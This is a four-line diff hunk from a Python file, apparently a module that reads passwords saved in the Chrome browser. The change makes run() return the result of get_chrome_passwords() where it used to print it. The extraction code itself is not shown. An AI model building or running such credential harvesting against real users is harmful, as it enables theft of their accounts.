@@ -39,4 +39,4 @@ def get_chrome_passwords():
 
 
 def run():
-    print str(get_chrome_passwords())
+    return str(get_chrome_passwords())
